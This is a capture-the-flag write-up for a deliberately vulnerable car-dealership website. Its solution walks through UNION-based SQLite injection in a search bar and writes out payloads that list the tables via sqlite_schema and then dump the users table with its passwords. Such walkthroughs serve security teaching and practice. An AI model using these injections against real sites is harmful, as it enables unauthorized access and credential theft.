# CRAZY UNCLE BEN'S CRAZY CAR DEALERSHIP

## Challenge description: 
We all got a crazy uncle Ben, and this one runs a car dealership! In typical uncle Ben fashion, he didn't check to see if his website had any vulnerabilities. Can you find all of the user's passwords?

## Hints
- Ever heard of SQLite injection?
- https://www.sqlite.org/faq.html#q7 
- Try to find the "users" table

## Solution
We know that we're looking for the user's passwords, so we need to find a database somewhere. When we put a double quote into the search bar, we see that it throws a server error. This means it's vulnerable to SQL Injection.
Now we need to find the users table. You could either guess the name or you could be fancy and find the table using the sqlite_schema table. 
We can infer that the command looks something like this
```sql
SELECT * FROM "cars" WHERE "model" LIKE "%{query}%";
```
So if we use SQL injection and the sqlite_schema table, the query will look something like this 
```sql
SELECT * FROM "cars" WHERE "model" LIKE "%" UNION SELECT name, 2, 3 FROM "sqlite_schema";--%";
```
So if we put " UNION SELECT name, 2, 3 FROM sqlite_schema;-- into the search bar, we get the names of the tables, cars and users. 
Now we use injection again to find the users
```sql
SELECT * FROM "cars" WHERE "model" LIKE "%" UNION SELECT * FROM "users";--%";
```
Now we get our users, and the flag